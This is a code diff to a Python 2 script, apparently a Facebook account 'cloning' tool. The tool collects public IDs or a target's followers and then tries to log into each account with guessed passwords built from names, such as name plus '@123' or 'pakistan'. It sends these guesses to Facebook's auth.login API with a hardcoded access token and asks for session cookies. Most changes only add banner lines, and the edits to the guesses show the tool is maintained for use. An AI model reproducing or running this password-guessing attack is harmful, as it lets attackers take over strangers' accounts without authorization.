@@ -212,10 +212,10 @@ def b_menu_select():
 	if select =="1":
 		os.system('clear')
 		print logo
-		print("")
 		os.system('echo -e "\t    Public ID Cloning " | lolcat')
-		print("")
+		os.system('echo -e "--------------------------------------------"| lolcat')
 		idt = raw_input(" Public ID ➤ \x1b[1;32m")
+                os.system('echo -e "--------------------------------------------"| lolcat')
 		os.system("clear")
 		print logo
 		os.system('echo -e "\t    Gathering Information " | lolcat')
@@ -227,6 +227,7 @@ def b_menu_select():
 			print("[\033[1;91m\033[1;47m------------PUBLIC ID CLONING-------------\033[0m]\033[0;97m")
 			os.system('echo -e "--------------------------------------------"| lolcat')
 			print(" \x1b[1;37mTarget user ➤ \x1b[1;32m"+q["name"])
+                        os.system('echo -e "--------------------------------------------"| lolcat')
 		except (KeyError , IOError):
 		    print("")
 		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
@@ -245,6 +246,7 @@ def b_menu_select():
 		print logo
 		print("[\033[1;91m\033[1;47m------------FOLLOWERS ID  CLONING-------------\033[0m]\033[0;97m")
 		idt = raw_input("\x1b[1;37m Public ID ➤ \x1b[1;32m")
+                os.system('echo -e "--------------------------------------------"| lolcat')
 		os.system("clear")
 		logo()
 		print("")
@@ -255,9 +257,10 @@ def b_menu_select():
 			q = json.loads(r.text)
 			os.system("clear")
 			logo()
-			print("")
 			os.system('echo -e "\t    Followers Cloning" | lolcat')
+                        os.system('echo -e "--------------------------------------------"| lolcat')
 			print(" Target user ➤ \x1b[1;32m "+q["name"])
+                        os.system('echo -e "--------------------------------------------"| lolcat')
 		except (KeyError , IOError):
 		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
 		    raw_input("\nPress enter to back ")
@@ -288,7 +291,7 @@ def b_menu_select():
 		user=arg
 		uid,name=user.split("|")
 		try:
-		    pass1=name+"123"
+		    pass1=name+"@123"
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		    d=json.loads(q)
 		    if 'www.facebook.com' in d['error_msg']:
@@ -390,7 +393,7 @@ def b_menu_select():
 		                                                    ok.close()
 		                                                    oks.append(uid)
 		                                                else:
-		                                                    pass7="pakistan"
+		                                                    pass7="name"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                                    d=json.loads(q)
 		                                                    if 'www.facebook.com' in d['error_msg']:
